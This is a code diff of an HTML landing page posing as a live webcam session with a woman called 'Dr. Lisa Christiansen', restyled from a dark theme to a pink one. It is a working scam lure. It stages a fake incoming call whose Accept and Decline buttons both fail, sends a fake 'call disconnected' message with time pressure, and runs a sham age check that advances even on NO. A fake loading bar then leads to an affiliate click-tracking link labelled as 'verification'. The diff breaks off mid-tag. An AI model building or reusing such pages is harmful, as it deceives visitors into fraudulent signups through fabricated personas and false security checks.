@@ -3,207 +3,214 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dr. Lisa Christiansen | Private Premium Node</title>
+    <title>Dr. Lisa Christiansen | Private Live Session</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;800&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         body { 
-            background: radial-gradient(circle at top right, #0d1326, #04060d); 
+            /* Premium Rose Gold & Violet Gradient Background */
+            background: linear-gradient(135deg, #2b0f4c 0%, #611655 50%, #f988a8 100%); 
             color: #ffffff; 
             font-family: 'Inter', sans-serif; 
             overflow-x: hidden; 
             min-height: 100vh;
+            background-attachment: fixed;
         }
-        h1, h2, h3, button, .font-bold { font-family: 'Montserrat', sans-serif; }
+        h1, h2, h3, .font-elegant { font-family: 'Playfair Display', serif; }
         
-        /* Premium Background Orbs */
-        .orb-1 { position: fixed; top: -150px; left: -100px; width: 600px; height: 600px; background: radial-gradient(circle, rgba(0, 229, 255, 0.08) 0%, rgba(0,0,0,0) 60%); z-index: -1; filter: blur(50px); animation: float 10s infinite alternate; }
-        .orb-2 { position: fixed; bottom: -150px; right: -100px; width: 600px; height: 600px; background: radial-gradient(circle, rgba(255, 0, 127, 0.08) 0%, rgba(0,0,0,0) 60%); z-index: -1; filter: blur(50px); animation: float 12s infinite alternate-reverse; }
-        @keyframes float { 0% { transform: translateY(0px) scale(1); } 100% { transform: translateY(30px) scale(1.1); } }
+        /* Soft Floating Orbs for High-End Look */
+        .orb-1 { position: fixed; top: -100px; left: -100px; width: 500px; height: 500px; background: radial-gradient(circle, rgba(255, 255, 255, 0.15) 0%, rgba(0,0,0,0) 70%); z-index: -1; filter: blur(40px); animation: float 8s infinite alternate; }
+        .orb-2 { position: fixed; bottom: -100px; right: -50px; width: 600px; height: 600px; background: radial-gradient(circle, rgba(255, 200, 220, 0.15) 0%, rgba(0,0,0,0) 70%); z-index: -1; filter: blur(50px); animation: float 12s infinite alternate-reverse; }
+        @keyframes float { 0% { transform: translateY(0px); } 100% { transform: translateY(40px); } }
         
-        /* Glassmorphism */
-        .glass { background: rgba(13, 17, 31, 0.55); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
+        /* Premium Light Glassmorphism */
+        .glass { background: rgba(255, 255, 255, 0.08); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 24px; box-shadow: 0 25px 50px rgba(0,0,0,0.2); }
         
-        .locked-card { background: linear-gradient(145deg, #111827, #0f1423); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 16px; padding: 14px; text-align: center; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; overflow: hidden; }
-        .locked-card:hover { border-color: #00e5ff; box-shadow: 0 0 20px rgba(0, 229, 255, 0.2); transform: translateY(-3px); }
+        .locked-card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 16px; padding: 16px; text-align: center; cursor: pointer; transition: all 0.3s ease; position: relative; overflow: hidden; backdrop-filter: blur(10px); }
+        .locked-card:hover { background: rgba(255, 255, 255, 0.15); border-color: rgba(255, 255, 255, 0.4); transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0,0,0,0.15); }
         
-        .video-vault-card { background: linear-gradient(145deg, #0d1222, #1a1632); border: 1px solid rgba(255, 0, 127, 0.15); border-radius: 12px; position: relative; overflow: hidden; cursor: pointer; transition: all 0.25s; aspect-ratio: 4/3; display: flex; flex-direction: column; justify-content: flex-end; }
-        .video-vault-card:hover { border-color: #ff007f; box-shadow: 0 0 20px rgba(255, 0, 127, 0.25); transform: scale(1.02); }
+        @keyframes live-blink { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(1.1); } }
+        .live-dot { animation: live-blink 1.5s infinite; }
         
-        @keyframes live-blink { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(1.15); } }
-        .live-dot { animation: live-blink 1.4s infinite; }
-        
-        @keyframes pulse-ring { 0% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.6); transform: scale(1); } 50% { transform: scale(1.05); } 70% { box-shadow: 0 0 0 15px rgba(34, 197, 94, 0); } 100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); transform: scale(1); } }
-        .btn-accept { animation: pulse-ring 1.2s infinite; }
+        @keyframes pulse-ring { 0% { box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.6); transform: scale(1); } 50% { transform: scale(1.05); } 70% { box-shadow: 0 0 0 15px rgba(255, 255, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); transform: scale(1); } }
+        .btn-accept { animation: pulse-ring 1.5s infinite; background: linear-gradient(135deg, #4ade80, #16a34a); }
 
-        .progress-bar-fill { width: 0%; transition: width 0.4s ease-in-out; }
+        .progress-bar-fill { width: 0%; transition: width 0.4s ease-in-out; background: linear-gradient(90deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%); }
     </style>
 </head>
 <body class="flex flex-col items-center min-h-screen relative" onclick="initAudioContext()">
 
     <audio id="ringtone" src="https://assets.mixkit.co/active_storage/sfx/2870/2870-preview.mp3" loop preload="auto"></audio>
+    
     <div class="orb-1"></div>
     <div class="orb-2"></div>
 
     <header class="w-full max-w-2xl p-4 z-40 sticky top-0">
-        <div class="glass p-3 px-4 flex items-center justify-between">
+        <div class="glass p-3 px-5 flex items-center justify-between">
             <div class="flex items-center gap-3">
                 <div class="relative">
-                    <img src="https://raw.githubusercontent.com/mizan000321-ops/newv/main/GoWoZl9X0AA1I6V.jpg" class="w-12 h-12 rounded-full border-2 border-[#ff007f] object-cover shadow-[0_0_15px_rgba(255,0,127,0.5)]">
-                    <div class="absolute bottom-0 right-0 w-3.5 h-3.5 bg-green-500 rounded-full border-2 border-black"></div>
+                    <img src="https://drive.google.com/uc?id=1DljnoDdClNr7db7M_okO1j8ccuDI-hBO" class="w-14 h-14 rounded-full border-2 border-white object-cover shadow-lg">
+                    <div class="absolute bottom-0 right-0 w-3.5 h-3.5 bg-green-400 rounded-full border-2 border-white"></div>
                 </div>
                 <div>
-                    <h1 class="text-[14px] sm:text-[16px] font-black tracking-wide italic">DR. LISA <span class="text-[#00e5ff]">CHRISTIANSEN</span></h1>
-                    <p class="text-[9px] text-pink-500 font-bold tracking-widest uppercase">Premium Live Session</p>
+                    <h1 class="text-lg font-elegant tracking-wide text-white drop-shadow-md">Dr. Lisa Christiansen</h1>
+                    <p class="text-[10px] text-pink-200 font-semibold tracking-widest uppercase mt-0.5">VIP Live Room</p>
                 </div>
             </div>
             <div class="flex flex-col items-end">
-                <div class="flex items-center gap-1.5 bg-red-500/10 border border-red-500/20 px-3 py-1 rounded-full mb-0.5">
-                    <div class="w-2 h-2 bg-red-500 rounded-full live-dot shadow-[0_0_8px_rgba(239,68,68,0.9)]"></div>
-                    <span class="text-[9px] font-bold text-red-400 uppercase tracking-widest">Waiting for You</span>
+                <div class="flex items-center gap-1.5 bg-white/20 border border-white/30 px-3 py-1 rounded-full mb-1 backdrop-blur-md">
+                    <div class="w-2 h-2 bg-green-400 rounded-full live-dot"></div>
+                    <span class="text-[10px] font-bold text-white uppercase tracking-wider">Online Now</span>
                 </div>
-                <span class="text-[8px] text-gray-500 uppercase tracking-widest">ENCRYPTED NODE</span>
             </div>
         </div>
     </header>
 
-    <main id="dashboardView" class="w-full max-w-2xl px-4 flex flex-col gap-5 mt-2 mb-10 transition-all duration-500">
+    <main id="dashboardView" class="w-full max-w-2xl px-4 flex flex-col gap-6 mt-4 mb-10 transition-all duration-500">
         
-        <div class="relative rounded-[24px] overflow-hidden glass aspect-[16/9] shadow-2xl cursor-pointer group border border-[#00e5ff]/20" onclick="triggerManualVerification()">
-            <img src="https://raw.githubusercontent.com/mizan000321-ops/newv/main/GoWoZl9X0AA1I6V.jpg" class="absolute inset-0 w-full h-full object-cover opacity-60 group-hover:scale-105 transition-transform duration-700">
-            <div class="absolute inset-0 bg-gradient-to-t from-black via-black/40 to-transparent flex flex-col justify-end p-6">
-                <div class="w-16 h-16 bg-[#ff007f]/30 border-2 border-[#ff007f] rounded-full flex items-center justify-center mb-3 mx-auto backdrop-blur-sm group-hover:bg-[#ff007f]/50 transition-colors animate-pulse">
+        <div class="bg-white/10 border-l-4 border-pink-300 p-4 rounded-r-xl backdrop-blur-sm shadow-lg text-sm font-medium text-pink-50 flex items-start gap-3">
+            <span class="text-2xl">🐾</span>
+            <p class="leading-relaxed text-xs sm:text-sm">
+                <strong class="text-white">Note:</strong> My dog will be joining me on the live cam today! If you don't like dogs or have a problem with pets, <span class="text-pink-200 font-bold underline">there's no need to join me.</span> I only want positive vibes in my 10-minute session.
+            </p>
+        </div>
+
+        <div class="relative rounded-[24px] overflow-hidden glass aspect-[16/9] shadow-2xl cursor-pointer group border border-white/30" onclick="triggerManualVerification()">
+            <img src="https://drive.google.com/uc?id=1DljnoDdClNr7db7M_okO1j8ccuDI-hBO" class="absolute inset-0 w-full h-full object-cover opacity-80 group-hover:scale-105 transition-transform duration-700">
+            <div class="absolute inset-0 bg-gradient-to-t from-[#2b0f4c]/90 via-[#611655]/40 to-transparent flex flex-col justify-end p-6">
+                <div class="w-16 h-16 bg-white/20 border border-white/50 rounded-full flex items-center justify-center mb-4 mx-auto backdrop-blur-md group-hover:bg-white/40 transition-colors animate-pulse shadow-xl">
                     <svg class="w-8 h-8 text-white ml-1" fill="currentColor" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
                 </div>
-                <h2 class="text-center font-black text-base sm:text-lg text-white tracking-wider uppercase drop-shadow-md">CONNECT TO MY LIVE BEDROOM CAMERA</h2>
+                <h2 class="text-center font-elegant font-bold text-lg sm:text-xl text-white tracking-wide drop-shadow-lg">JOIN LIVE VIDEO CAM</h2>
+                <p class="text-center text-[11px] text-pink-100 mt-1 uppercase tracking-widest">Max Duration: 10 Minutes</p>
             </div>
         </div>
 
-        <div class="grid grid-cols-3 gap-3">
+        <div class="grid grid-cols-3 gap-3 sm:gap-4">
             <div class="locked-card" onclick="triggerManualVerification()">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="w-8 h-8 mb-2">
-                <div class="text-[11px] font-bold text-gray-200">WhatsApp</div>
-                <div class="text-[9px] text-pink-500 mt-1 uppercase font-black">🔒 Locked</div>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="w-8 h-8 mb-2 mx-auto drop-shadow-md">
+                <div class="text-[12px] font-bold text-white">WhatsApp</div>
+                <div class="text-[9px] text-pink-200 mt-1 uppercase font-bold tracking-wider">🔒 Locked</div>
             </div>
             <div class="locked-card" onclick="triggerManualVerification()">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="w-8 h-8 mb-2">
-                <div class="text-[11px] font-bold text-gray-200">Telegram</div>
-                <div class="text-[9px] text-pink-500 mt-1 uppercase font-black">🔒 Locked</div>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="w-8 h-8 mb-2 mx-auto drop-shadow-md">
+                <div class="text-[12px] font-bold text-white">Telegram</div>
+                <div class="text-[9px] text-pink-200 mt-1 uppercase font-bold tracking-wider">🔒 Locked</div>
             </div>
             <div class="locked-card" onclick="triggerManualVerification()">
-                <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" class="w-8 h-8 mb-2">
-                <div class="text-[11px] font-bold text-gray-200">Snapchat</div>
-                <div class="text-[9px] text-pink-500 mt-1 uppercase font-black">🔒 Locked</div>
+                <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" class="w-8 h-8 mb-2 mx-auto drop-shadow-md">
+                <div class="text-[12px] font-bold text-white">Snapchat</div>
+                <div class="text-[9px] text-pink-200 mt-1 uppercase font-bold tracking-wider">🔒 Locked</div>
             </div>
         </div>
     </main>
 
-    <div id="incomingCallScreen" class="fixed inset-0 bg-[#050811]/95 backdrop-blur-3xl z-[100] flex-col items-center justify-between py-20 hidden opacity-0 transition-opacity duration-300">
-        <div class="text-center w-full px-4">
-            <p class="text-[#00e5ff] text-xs font-bold tracking-widest uppercase mb-6 animate-pulse">Incoming Live Video Request</p>
-            <div class="relative w-40 h-40 mx-auto mb-6">
-                <div class="absolute inset-0 rounded-full border-4 border-[#ff007f]/40 animate-ping" style="animation-duration: 1.5s;"></div>
-                <div class="absolute inset-0 rounded-full border-4 border-[#00e5ff]/20 animate-ping" style="animation-duration: 2s; animation-delay: 0.5s;"></div>
-                <img src="https://raw.githubusercontent.com/mizan000321-ops/newv/main/GoWoZl9X0AA1I6V.jpg" class="w-full h-full rounded-full border-4 border-[#ff007f] object-cover relative z-10 shadow-[0_0_50px_rgba(255,0,127,0.6)]">
+    <div id="incomingCallScreen" class="fixed inset-0 bg-[#2b0f4c]/95 backdrop-blur-3xl z-[100] flex-col items-center justify-between py-16 hidden opacity-0 transition-opacity duration-500">
+        <div class="text-center w-full px-4 mt-10">
+            <p class="text-pink-300 text-xs font-bold tracking-widest uppercase mb-8 animate-pulse">Incoming Live Video</p>
+            <div class="relative w-40 h-40 mx-auto mb-8">
+                <div class="absolute inset-0 rounded-full border-2 border-white/50 animate-ping" style="animation-duration: 2s;"></div>
+                <div class="absolute inset-0 rounded-full border-2 border-pink-300/30 animate-ping" style="animation-duration: 2.5s; animation-delay: 0.5s;"></div>
+                <img src="https://drive.google.com/uc?id=1DljnoDdClNr7db7M_okO1j8ccuDI-hBO" class="w-full h-full rounded-full border-4 border-white object-cover relative z-10 shadow-2xl">
             </div>
-            <h2 class="text-3xl font-black text-white tracking-tight mb-2">Dr. Lisa</h2>
-            <p class="text-green-400 text-sm font-bold live-dot">Ringing...</p>
+            <h2 class="text-4xl font-elegant text-white tracking-wide mb-3 drop-shadow-lg">Dr. Lisa</h2>
+            <p class="text-pink-200 text-sm font-medium tracking-wide live-dot">Calling you now...</p>
         </div>
-        <div class="flex justify-center gap-16 w-full px-8 mb-10">
-            <div class="flex flex-col items-center gap-3 cursor-pointer z-50" onclick="dropCall()">
-                <div class="w-16 h-16 bg-red-600 rounded-full flex items-center justify-center shadow-[0_0_20px_rgba(220,38,38,0.4)]"><svg class="w-8 h-8 text-white transform rotate-[135deg]" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16.32v3.38a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 013.31 2h3.38a2 2 0 012 1.72 12.84 12.84 0 00.57 2.81 2 2 0 01-.45 2.11L7.5 10.05a16.03 16.03 0 006.45 6.45l1.41-1.41a2 2 0 012.11-.45 12.84 12.84 0 002.81.57A2 2 0 0121 16.32z"/></svg></div>
-                <span class="text-white text-xs font-bold opacity-70">Decline</span>
+        <div class="flex justify-center gap-16 w-full px-8 mb-12">
+            <div class="flex flex-col items-center gap-3 cursor-pointer z-50 transition-transform hover:scale-110" onclick="dropCall()">
+                <div class="w-16 h-16 bg-red-500 rounded-full flex items-center justify-center shadow-lg"><svg class="w-8 h-8 text-white transform rotate-[135deg]" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16.32v3.38a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 013.31 2h3.38a2 2 0 012 1.72 12.84 12.84 0 00.57 2.81 2 2 0 01-.45 2.11L7.5 10.05a16.03 16.03 0 006.45 6.45l1.41-1.41a2 2 0 012.11-.45 12.84 12.84 0 002.81.57A2 2 0 0121 16.32z"/></svg></div>
+                <span class="text-white text-xs font-medium opacity-80">Decline</span>
             </div>
-            <div class="flex flex-col items-center gap-3 cursor-pointer z-50" onclick="dropCall()">
-                <div class="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center btn-accept"><svg class="w-8 h-8 text-black" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16.32v3.38a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 013.31 2h3.38a2 2 0 012 1.72 12.84 12.84 0 00.57 2.81 2 2 0 01-.45 2.11L7.5 10.05a16.03 16.03 0 006.45 6.45l1.41-1.41a2 2 0 012.11-.45 12.84 12.84 0 002.81.57A2 2 0 0121 16.32z"/></svg></div>
-                <span class="text-white text-xs font-bold">Accept Call</span>
+            <div class="flex flex-col items-center gap-3 cursor-pointer z-50 transition-transform hover:scale-110" onclick="dropCall()">
+                <div class="w-16 h-16 rounded-full flex items-center justify-center btn-accept shadow-lg"><svg class="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16.32v3.38a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 013.31 2h3.38a2 2 0 012 1.72 12.84 12.84 0 00.57 2.81 2 2 0 01-.45 2.11L7.5 10.05a16.03 16.03 0 006.45 6.45l1.41-1.41a2 2 0 012.11-.45 12.84 12.84 0 002.81.57A2 2 0 0121 16.32z"/></svg></div>
+                <span class="text-white text-xs font-bold">Accept</span>
             </div>
         </div>
     </div>
 
-    <div id="missedCallModal" class="fixed inset-0 z-[110] bg-[#000000]/80 backdrop-blur-md hidden flex-col items-center justify-center p-4">
-        <div class="w-full max-w-md glass p-6 border-t-4 border-t-[#ff007f] relative text-center">
-            <div class="w-14 h-14 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-red-500">
-                <svg class="w-6 h-6 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+    <div id="missedCallModal" class="fixed inset-0 z-[110] bg-[#1a082e]/80 backdrop-blur-xl hidden flex-col items-center justify-center p-4">
+        <div class="w-full max-w-md glass p-6 border-t-4 border-t-pink-400 relative text-center shadow-2xl">
+            <div class="w-14 h-14 bg-white/10 rounded-full flex items-center justify-center mx-auto mb-4 border border-white/20 backdrop-blur-md">
+                <svg class="w-6 h-6 text-pink-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
             </div>
-            <h2 class="text-xl font-black text-white mb-2 uppercase">Call Disconnected!</h2>
+            <h2 class="text-xl font-elegant text-white mb-3">Call Disconnected</h2>
             
-            <div class="bg-[#111827] rounded-xl p-4 text-left border border-white/5 mb-6 relative">
-                <div class="absolute -top-3 left-4 bg-pink-600 text-white text-[9px] font-black uppercase px-2 py-0.5 rounded shadow-lg">New Message from Lisa</div>
-                <p class="text-sm text-gray-300 leading-relaxed mt-2 font-medium">
-                    "Hey babe! I tried calling you to start our live cam but the server dropped it because you don't have a verified account yet! 😩<br><br>
-                    <span class="text-[#00e5ff] font-bold">Listen, I only do face-to-face video for a MAX of 10 minutes a day because I'm super busy.</span> I can't stay online long. We can always talk again tomorrow, but hurry up and verify your age right now so we don't miss our 10 minutes today! I'm waiting! ❤️"
+            <div class="bg-black/20 rounded-xl p-5 text-left border border-white/10 mb-6 relative backdrop-blur-md">
+                <div class="absolute -top-3 left-4 bg-pink-500 text-white text-[10px] font-bold uppercase px-3 py-1 rounded-full shadow-lg">Voice Note</div>
+                <p class="text-sm text-pink-50 leading-relaxed mt-2">
+                    "Hey! I tried calling you to start our live cam but it dropped because your account isn't verified yet! 😩<br><br>
+                    Just a reminder—my dog is right here with me. <strong class="text-white">If you don't like dogs, no need to join.</strong> But if you're ready, hurry up! I only do video for a <strong class="text-pink-300">MAX of 10 minutes</strong> today because I'm super busy. We can always talk another time, but verify your account right now so we don't miss our 10 minutes today! Waiting for you! ❤️🐾"
                 </p>
             </div>
 
-            <button onclick="startWizard()" class="w-full bg-gradient-to-r from-[#ff007f] to-[#00e5ff] text-white font-black py-4 rounded-xl text-sm uppercase tracking-widest shadow-[0_0_30px_rgba(255,0,127,0.4)] hover:scale-[1.02] transition animate-pulse">
-                VERIFY ACCOUNT & CALL BACK
+            <button onclick="startWizard()" class="w-full bg-white text-[#611655] font-bold py-4 rounded-xl text-sm uppercase tracking-widest shadow-[0_0_20px_rgba(255,255,255,0.3)] hover:bg-pink-50 transition transform hover:-translate-y-1">
+                Verify Account to Reconnect
             </button>
         </div>
     </div>
 
-    <div id="gateOverlay" class="fixed inset-0 z-[120] bg-[#050811]/98 backdrop-blur-2xl hidden flex-col items-center justify-center p-4">
-        <div class="w-full max-w-md glass p-6 sm:p-8 shadow-[0_0_50px_rgba(0,229,255,0.1)] border border-white/10 relative">
+    <div id="gateOverlay" class="fixed inset-0 z-[120] bg-[#2b0f4c]/95 backdrop-blur-3xl hidden flex-col items-center justify-center p-4">
+        <div class="w-full max-w-md glass p-6 sm:p-8 shadow-2xl border border-white/20 relative">
             
-            <div class="flex items-center gap-3 border-b border-white/5 pb-4 mb-6">
-                <img src="https://raw.githubusercontent.com/mizan000321-ops/newv/main/GoWoZl9X0AA1I6V.jpg" class="w-10 h-10 rounded-full border-2 border-[#ff007f] object-cover">
+            <div class="flex items-center gap-4 border-b border-white/10 pb-5 mb-6">
+                <img src="https://drive.google.com/uc?id=1DljnoDdClNr7db7M_okO1j8ccuDI-hBO" class="w-12 h-12 rounded-full border-2 border-pink-300 object-cover shadow-lg">
                 <div>
-                    <h3 class="text-xs font-black uppercase text-white tracking-wider">Secure Registration</h3>
-                    <p class="text-[10px] text-gray-400">Verifying to restore live feed...</p>
+                    <h3 class="text-sm font-bold uppercase text-white tracking-wider">Security Check</h3>
+                    <p class="text-[11px] text-pink-200">Restoring encrypted live feed...</p>
                 </div>
             </div>
 
             <div id="step1" class="wizard-step flex flex-col">
-                <span class="text-[10px] uppercase tracking-widest font-black text-[#00e5ff] mb-2">Security Check: Step 1 of 3</span>
-                <h2 class="text-lg font-black text-white leading-tight mb-4">Are you at least 18 years of age or older?</h2>
-                <div class="grid grid-cols-2 gap-3 mt-4">
-                    <button onclick="nextStep(2)" class="bg-gradient-to-r from-[#ff007f] to-pink-600 text-white font-black py-3.5 rounded-xl text-xs uppercase tracking-wider hover:scale-[1.02] transition shadow-lg">YES, I AM 18+</button>
-                    <button onclick="nextStep(2)" class="bg-white/5 text-gray-300 font-bold py-3.5 rounded-xl text-xs uppercase tracking-wider transition">NO</button>
+                <span class="text-[10px] uppercase tracking-widest font-bold text-pink-300 mb-2">Step 1 of 3</span>
+                <h2 class="text-xl font-elegant text-white leading-tight mb-5">Are you at least 18 years old?</h2>
+                <div class="grid grid-cols-2 gap-3 mt-2">
+                    <button onclick="nextStep(2)" class="bg-white/20 hover:bg-white/30 border border-white/30 text-white font-bold py-3.5 rounded-xl text-xs uppercase tracking-wider transition backdrop-blur-md shadow-lg">YES, I AM 18+</button>
+                    <button onclick="nextStep(2)" class="bg-black/20 hover:bg-black/30 border border-white/10 text-pink-100 font-bold py-3.5 rounded-xl text-xs uppercase tracking-wider transition">NO</button>
                 </div>
             </div>
 
             <div id="step2" class="wizard-step hidden flex flex-col">
-                <span class="text-[10px] uppercase tracking-widest font-black text-[#ff007f] mb-2">Security Check: Step 2 of 3</span>
-                <h2 class="text-lg font-black text-white leading-tight mb-4">I only have 10 minutes today. Are you ready right now?</h2>
-                <div class="flex flex-col gap-2.5 mt-4">
-                    <button onclick="nextStep(3)" class="bg-gradient-to-r from-[#00e5ff] to-blue-600 text-slate-950 font-black py-3.5 rounded-xl text-xs uppercase tracking-wider hover:scale-[1.02] transition shadow-lg">YES, I'M READY NOW</button>
-                    <button onclick="nextStep(3)" class="bg-white/5 text-gray-300 font-bold py-3.5 rounded-xl text-xs uppercase tracking-wider transition">I'LL BE READY IN 5 MINS</button>
+                <span class="text-[10px] uppercase tracking-widest font-bold text-pink-300 mb-2">Step 2 of 3</span>
+                <h2 class="text-xl font-elegant text-white leading-tight mb-5">I only have 10 minutes, and my dog is here. Are you okay with that?</h2>
+                <div class="flex flex-col gap-3 mt-2">
+                    <button onclick="nextStep(3)" class="bg-white/20 hover:bg-white/30 border border-white/30 text-white font-bold py-3.5 rounded-xl text-xs uppercase tracking-wider transition backdrop-blur-md shadow-lg">YES, I LOVE DOGS & I'M READY</button>
+                    <button onclick="nextStep(3)" class="bg-black/20 hover:bg-black/30 border border-white/10 text-pink-100 font-bold py-3.5 rounded-xl text-xs uppercase tracking-wider transition">I NEED 5 MINUTES</button>
                 </div>
             </div>
 
             <div id="step3" class="wizard-step hidden flex flex-col">
-                <span class="text-[10px] uppercase tracking-widest font-black text-[#00e5ff] mb-2">Security Check: Step 3 of 3</span>
-                <h2 class="text-lg font-black text-white leading-tight mb-4">Choose how we connect for our 10-minute session:</h2>
-                <div class="flex flex-col gap-2.5 mt-4">
-                    <button onclick="runLoadingSequence()" class="bg-white/5 border border-white/10 hover:border-[#ff007f] text-left p-3 rounded-xl transition flex items-center justify-between group">
-                        <span class="text-xs font-bold group-hover:text-[#ff007f]">Face-to-Face Live Video Cam</span>
-                        <span class="text-[10px] text-gray-500">▶</span>
+                <span class="text-[10px] uppercase tracking-widest font-bold text-pink-300 mb-2">Step 3 of 3</span>
+                <h2 class="text-xl font-elegant text-white leading-tight mb-5">Choose how we connect:</h2>
+                <div class="flex flex-col gap-3 mt-2">
+                    <button onclick="runLoadingSequence()" class="bg-black/20 hover:bg-white/10 border border-white/20 hover:border-pink-300 text-left p-4 rounded-xl transition flex items-center justify-between group backdrop-blur-md">
+                        <span class="text-sm font-bold text-white group-hover:text-pink-200">Face-to-Face Live Cam</span>
+                        <span class="text-[12px] text-pink-300">▶</span>
                     </button>
-                    <button onclick="runLoadingSequence()" class="bg-white/5 border border-white/10 hover:border-[#00e5ff] text-left p-3 rounded-xl transition flex items-center justify-between group">
-                        <span class="text-xs font-bold group-hover:text-[#00e5ff]">Send me your WhatsApp/Snapchat</span>
-                        <span class="text-[10px] text-gray-500">▶</span>
+                    <button onclick="runLoadingSequence()" class="bg-black/20 hover:bg-white/10 border border-white/20 hover:border-pink-300 text-left p-4 rounded-xl transition flex items-center justify-between group backdrop-blur-md">
+                        <span class="text-sm font-bold text-white group-hover:text-pink-200">Send me your WhatsApp</span>
+                        <span class="text-[12px] text-pink-300">▶</span>
                     </button>
                 </div>
             </div>
 
-            <div id="loadingStep" class="wizard-step hidden flex flex-col items-center text-center py-6">
-                <div class="relative w-16 h-16 mb-4">
-                    <div class="absolute inset-0 rounded-full border-4 border-[#ff007f]/20 border-t-[#ff007f] animate-spin"></div>
+            <div id="loadingStep" class="wizard-step hidden flex flex-col items-center text-center py-8">
+                <div class="relative w-16 h-16 mb-5">
+                    <div class="absolute inset-0 rounded-full border-4 border-white/10 border-t-pink-300 animate-spin"></div>
                 </div>
-                <h2 id="loadingText" class="text-sm font-black text-white uppercase tracking-wider mb-2">Connecting Server...</h2>
-                <div class="w-full bg-white/5 h-1.5 rounded-full overflow-hidden mt-4">
-                    <div id="progressBar" class="h-full bg-gradient-to-r from-[#ff007f] to-[#00e5ff] progress-bar-fill"></div>
+                <h2 id="loadingText" class="text-sm font-bold text-white uppercase tracking-wider mb-3">Connecting Server...</h2>
+                <div class="w-full bg-black/30 h-2 rounded-full overflow-hidden mt-4 border border-white/10">
+                    <div id="progressBar" class="h-full progress-bar-fill"></div>
                 </div>
             </div>
 
-            <div id="finalStep" class="wizard-step hidden flex flex-col text-center items-center">
-                <div class="w-12 h-12 bg-green-500/10 border border-green-500/30 text-green-400 rounded-full flex items-center justify-center text-xl mb-3 animate-bounce">✓</div>
-                <h2 class="text-xl font-black text-white leading-tight mb-2">ACCOUNT REQUIRED</h2>
-                <p class="text-xs text-gray-300 mb-6 bg-red-500/10 p-3 rounded-lg border border-red-500/20">
-                    My timer is ticking! ⏳ Complete the free sponsor signup on the next page to verify your account so we can start our 10 minutes!
+            <div id="finalStep" class="wizard-step hidden flex flex-col text-center items-center py-2">
+                <div class="w-14 h-14 bg-white/10 border border-white/30 text-white rounded-full flex items-center justify-center text-2xl mb-4 shadow-[0_0_15px_rgba(255,255,255,0.3)] animate-bounce backdrop-blur-md">✓</div>
+                <h2 class="text-2xl font-elegant text-white leading-tight mb-2">Verification Needed</h2>
+                <p class="text-sm text-pink-100 mb-6 bg-black/20 p-4 rounded-xl border border-white/10 backdrop-blur-sm">
+                    My timer is ticking! ⏳ Complete the quick free verification on the next page to unlock the room. I'm waiting!
                 </p>
-                <a id="cpaAnchor" href="https://t.taffizerq.com/click?pid=3844&offer_id=2310" target="_blank" class="w-full bg-gradient-to-r from-[#ff007f] via-purple-600 to-[#00e5ff] text-white font-black py-4 rounded-xl text-sm uppercase tracking-widest shadow-[0_0_30px_rgba(255,0,127,0.4)] hover:scale-[1.02] transition block animate-pulse">
-                    CREATE FREE ACCOUNT & CALL LISA
+                <a id="cpaAnchor" href="https://t.taffizerq.com/click?pid=3844&offer_id=2310" target="_blank" class="w-full bg-white text-[#611655] font-black py-4 rounded-xl text-sm uppercase tracking-widest shadow-[0_0_25px_rgba(255,255,255,0.4)] hover:bg-pink-50 transition transform hover:-translate-y-1 block">
